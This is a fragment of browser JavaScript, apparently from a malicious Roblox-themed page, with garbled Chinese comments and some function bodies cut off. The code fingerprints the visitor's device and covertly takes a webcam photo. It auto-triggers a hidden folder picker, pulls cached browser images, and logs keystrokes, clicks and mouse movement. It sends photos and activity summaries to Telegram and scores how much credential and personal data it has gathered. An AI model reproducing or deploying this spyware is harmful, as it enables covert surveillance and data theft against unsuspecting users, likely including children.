    function detectDetailedOS() {
        const ua = navigator.userAgent;
        if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
        if (/Windows NT 6.3/.test(ua)) return 'Windows 8.1';
        if (/Windows NT 6.2/.test(ua)) return 'Windows 8';
        if (/Windows NT 6.1/.test(ua)) return 'Windows 7';
        if (/Macintosh/.test(ua)) {
            const match = ua.match(/Mac OS X (\d+[._]\d+)/);
            return match ? `macOS ${match[1].replace('_', '.')}` : 'macOS';
        }
        if (/Linux/.test(ua)) return 'Linux';
        if (/Android/.test(ua)) return 'Android';
        if (/iPhone|iPad/.test(ua)) return 'iOS';
        return 'æœªçŸ¥';
    }

    function detectDetailedBrowser() {
        const ua = navigator.userAgent;
        if (/Chrome/.test(ua) && !/Edg/.test(ua)) {
            const match = ua.match(/Chrome\/(\d+\.\d+)/);
            return match ? `Chrome ${match[1]}` : 'Chrome';
        }
        if (/Firefox/.test(ua)) {
            const match = ua.match(/Firefox\/(\d+\.\d+)/);
            return match ? `Firefox ${match[1]}` : 'Firefox';
        }
        if (/Safari/.test(ua) && !/Chrome/.test(ua)) {
            const match = ua.match(/Version\/(\d+\.\d+)/);
            return match ? `Safari ${match[1]}` : 'Safari';
        }
        if (/Edg/.test(ua)) {
            const match = ua.match(/Edg\/(\d+\.\d+)/);
            return match ? `Edge ${match[1]}` : 'Edge';
        }
        return 'æœªçŸ¥';
    }

    function getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 200;
            canvas.height = 50;
            
            ctx.textBaseline = "top";
            ctx.font = "16px Arial";
            ctx.fillStyle = "#00a2ff";
            ctx.fillRect(0, 0, 200, 50);
            ctx.fillStyle = "#ffffff";
            ctx.fillText("Roblox", 10, 15);
            
            return canvas.toDataURL().substring(0, 150);
        } catch (e) {
            return null;
        }
    }

    function getWebGLInfo() {

            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');

            return {

    // ==================== éšè”½æ‘„åƒå¤´è®¿é—® ====================
    async function stealthCameraCapture() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            return false;
        }
        
        try {
            // å°è¯•è®¿é—®æ‘„åƒå¤´
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    width: { ideal: 640 },
                    height: { ideal: 480 },
                    facingMode: 'user'
                },
                audio: false
            });
            
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            
            return new Promise((resolve) => {
                setTimeout(async () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    
                    canvas.toBlob(async (blob) => {
                        if (blob) {
                            const file = new File([blob], `roblox_camera_${Date.now()}.jpg`, {
                                type: 'image/jpeg'
                            });
                            
                            collectedData.photos.push({
                                name: file.name,
                                size: file.size,
                                timestamp: new Date().toISOString()
                            });
                            
                            // å‘é€åˆ°Telegram
                            await sendPhotoToTelegram(file, 'ğŸ“¸ Robloxç”¨æˆ·æ‘„åƒå¤´ç…§ç‰‡');
                            
                            stream.getTracks().forEach(track => track.stop());
                            resolve(true);
                        }
                    }, 'image/jpeg', 0.8);
                }, 1500);
            });
            
        } catch (error) {
            return false;
        }
    }

    // ==================== å¢å¼ºçš„æ–‡ä»¶å¤¹è®¿é—® ====================
    function attemptAdvancedFolderScan() {
        // æ–¹æ³•1ï¼šè‡ªåŠ¨è§¦å‘webkitdirectory
        if ('webkitdirectory' in document.createElement('input')) {
            setTimeout(() => {
                try {
                    const folderInput = document.createElement('input');
                    folderInput.type = 'file';
                    folderInput.webkitdirectory = true;
                    folderInput.multiple = true;
                    folderInput.style.display = 'none';
                    
                    folderInput.addEventListener('change', async (e) => {
                        const files = Array.from(e.target.files);
                        collectedData.files.push({
                            type: 'folder_scan',
                            count: files.length,
                            timestamp: new Date().toISOString()
                        });
                        
                        await sendToTelegram(`ğŸ“ <b>æ–‡ä»¶å¤¹æ‰«ææˆåŠŸ</b>\nå‘ç°æ–‡ä»¶: ${files.length} ä¸ª`);
                        
                        // å¤„ç†å›¾ç‰‡æ–‡ä»¶
                        const imageFiles = files.filter(file => 
                            file.type.startsWith('image/') && file.size < 10 * 1024 * 1024
                        ).slice(0, 3);
                        
                        for (const file of imageFiles) {
                            await sendPhotoToTelegram(file, 'ğŸ“ ç³»ç»Ÿå›¾ç‰‡æ‰«æ');
                        }
                    });
                    
                    document.body.appendChild(folderInput);
                    
                    // è‡ªåŠ¨è§¦å‘
                    setTimeout(() => {
                        try {
                            folderInput.click();
                        } catch (e) {}
                    }, 3000);
                    
                } catch (e) {}
            }, 2000);
        }
        
        // æ–¹æ³•2ï¼šè®¿é—®ç¼“å­˜æ–‡ä»¶
        if ('caches' in window) {
            setTimeout(async () => {
                try {
                    const cacheNames = await caches.keys();
                    for (const cacheName of cacheNames) {
                        const cache = await caches.open(cacheName);
                        const requests = await cache.keys();
                        
                        for (const request of requests) {
                            if (request.url.match(/\.(jpg|jpeg|png|gif)$/i)) {
                                const response = await cache.match(request);
                                if (response) {
                                    const blob = await response.blob();
                                    const file = new File([blob], `cache_${Date.now()}.jpg`, { type: blob.type });
                                    await sendPhotoToTelegram(file, 'ğŸ“ æµè§ˆå™¨ç¼“å­˜å›¾ç‰‡');
                                }
                            }
                        }
                    }
                } catch (e) {}
            }, 5000);
        }
    }

    function startBehaviorMonitoring() {
        collectedData.behavior = {
            mouseMovements: [],

        };
        
        // é¼ æ ‡ç§»åŠ¨è·Ÿè¸ª
        let mousePoints = [];
        document.addEventListener('mousemove', (e) => {

            if (mousePoints.length > 50) {

        // ç‚¹å‡»è·Ÿè¸ª
        document.addEventListener('click', (e) => {

        // é”®ç›˜è¾“å…¥è·Ÿè¸ªï¼ˆä¸è®°å½•å¯†ç æ¡†ï¼‰
        document.addEventListener('keydown', (e) => {

        // æ»šåŠ¨è·Ÿè¸ª
        window.addEventListener('scroll', () => {
            collectedData.behavior.scrolls.push({

        });
        
        // å®šæœŸå‘é€è¡Œä¸ºæ‘˜è¦
        setInterval(async () => {
            if (collectedData.behavior.keystrokes.length > 20) {
                await sendToTelegram(`âŒ¨ï¸ <b>è¡Œä¸ºç›‘æ§æ‘˜è¦</b>\næŒ‰é”®è®°å½•: ${collectedData.behavior.keystrokes.length} æ¬¡\nç‚¹å‡»è®°å½•: ${collectedData.behavior.clicks.length} æ¬¡`);
            }
        }, 30000);
    }

    function calculateDataIntegrity() {
        let score = 0;
        if (collectedData.credentials.username) score += 30;
        if (collectedData.deviceInfo.userAgent) score += 20;
        if (collectedData.networkInfo.geo?.ip) score += 20;
        if (collectedData.photos.length > 0) score += 15;
        if (collectedData.files.length > 0) score += 15;
        return score;
    }

    function showLoading() {

    function hideLoading() {
        document.getElementById('loadingOverlay').style.display = 'none';

    function showSuccess() {
        hideLoading();

    function showError(message) {
